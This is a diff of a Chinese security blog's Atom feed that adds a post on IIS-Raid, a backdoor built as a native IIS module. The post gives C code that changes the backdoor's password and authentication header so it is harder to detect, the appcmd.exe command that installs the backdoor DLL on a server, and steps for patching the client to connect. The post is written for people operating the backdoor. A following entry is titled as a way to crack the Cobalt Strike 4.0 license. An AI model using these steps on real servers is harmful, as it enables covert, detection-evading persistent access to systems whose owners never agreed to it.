@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://ca3tie1.github.io</id>
     <title>Castiel&apos;s Blog</title>
-    <updated>2020-03-23T12:42:08.320Z</updated>
+    <updated>2020-03-23T13:49:57.893Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://ca3tie1.github.io"/>
     <link rel="self" href="https://ca3tie1.github.io/atom.xml"/>
@@ -10,6 +10,60 @@
     <logo>https://ca3tie1.github.io/images/avatar.png</logo>
     <icon>https://ca3tie1.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, Castiel&apos;s Blog</rights>
+    <entry>
+        <title type="html"><![CDATA[IIS Raid-使用本地模块构建的IIS后门]]></title>
+        <id>https://ca3tie1.github.io/post/iis-raid-shi-yong-ben-di-mo-kuai-gou-jian-de-iis-hou-men/</id>
+        <link href="https://ca3tie1.github.io/post/iis-raid-shi-yong-ben-di-mo-kuai-gou-jian-de-iis-hou-men/">
+        </link>
+        <updated>2020-03-23T13:10:57.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="0x00-简介">0x00 简介</h1>
+<p>之前刷TW的时候在墙外看到老外分享的这款使用IIS的本地模块构建IIS后门，功能可以自定义命令执行，dumhash等。感觉不错。于是下了下来试了下，测试有一点小瑕疵，随即修改了下，原版项目地址(https://github.com/0x09AL/IIS-Raid)。</p>
+<h1 id="0x01-安装和部署">0x01 安装和部署</h1>
+<h2 id="自定义密码字段">自定义密码字段</h2>
+<p>在使用之前你得修改默认密码，已放置别人蹭你后门。代码在<code>/module/Functions.h</code>中定义，如下：</p>
+<pre><code class="language-c">// Communication Header for the Response.
+#define COM_HEADER &quot;X-Chrome-Variations&quot;
+#define PASS_FILE &quot;C:\\Windows\\Temp\\creds.db&quot;
+#define PASSWORD &quot;SIMPLEPASS&quot;
+</code></pre>
+<p><code>SIMPLEPASS</code> 就是自定义的密码值，连接后门的时候在<code>HttpHeader</code>中定义，但是这里原版的定义密码的HTTP头字段始终是一个值(<code>X-Password</code>)。这无疑是一个典型的特征了，所以这里得实现自定义这个字段值，在以上定义代码中添加一个常量<code>COM_PASSWD</code>，如下代码：</p>
+<pre><code class="language-c">// Communication Header for the Response.
+#define COM_HEADER &quot;X-Chrome-Variations&quot;
+#define COM_PASSWD &quot;X-CT-BALA&quot;
+#define PASS_FILE &quot;C:\\Windows\\Temp\\creds.db&quot;
+#define PASSWORD &quot;SIMPLEPASS&quot;
+</code></pre>
+<p>然后再更改<code>/module/HttpFactory.cpp</code>39行代码替换掉<code>X-Password</code>值为自定义的常量，如下代码：</p>
+<pre><code class="language-c">// Check the header password
+    USHORT uPLen = 0;
+    LPCSTR lpPassword = pHttpRequest-&gt;GetHeader(COM_PASSWD, &amp;uPLen);
+
+    if (lpPassword == NULL) {
+        return RQ_NOTIFICATION_CONTINUE;
+    }
+    else if (strcmp(PASSWORD, lpPassword) != 0) {
+        return RQ_NOTIFICATION_CONTINUE;
+    }
+</code></pre>
+<h2 id="安装">安装</h2>
+<p>安装比较简单，可以直接在命令行下使用<code>appcmd.exe</code>命令安装，命令如下：</p>
+<pre><code class="language-cmd">C:\Windows\system32\inetsrv\APPCMD.EXE install module /name:Module Name /image:&quot;%windir%\System32\inetsrv\IIS-Backdoor.dll&quot; /add:true
+</code></pre>
+<p>安装成功后入下图所示：<br>
+<img src="https://ca3tie1.github.io/post-images/1584970589793.png" alt="" loading="lazy"></p>
+<h1 id="0x02-使用">0x02 使用</h1>
+<p>客户端是py写的一个脚本，但貌似编码有点问题，运行时候回报错，需要去掉py脚本里的banner字符串就可以正常了。如果自定义了密码字段名还需要修改下脚本以便支持自定义HTTP头字段。如下图：<br>
+添加个<code>--headpass</code>的命令行参数<br>
+<img src="https://ca3tie1.github.io/post-images/1584971076050.jpg" alt="" loading="lazy"></p>
+<p>把自定义的HTT头字段名加入到HttpHeader中<br>
+<img src="https://ca3tie1.github.io/post-images/1584971210082.jpg" alt="" loading="lazy"></p>
+<p>连接成功入后如下图所示：<br>
+<img src="https://ca3tie1.github.io/post-images/1584971290912.png" alt="" loading="lazy"></p>
+<h1 id="0x03-参考">0x03 参考</h1>
+<p>原文 https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/<br>
+演示 https://youtu.be/jbxEWOXecuU</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[CobaltStrike4.0无Hook蛮力Cracked License思路]]></title>
         <id>https://ca3tie1.github.io/post/cobaltstrike40-wu-hook-man-li-cracked-license-si-lu/</id>
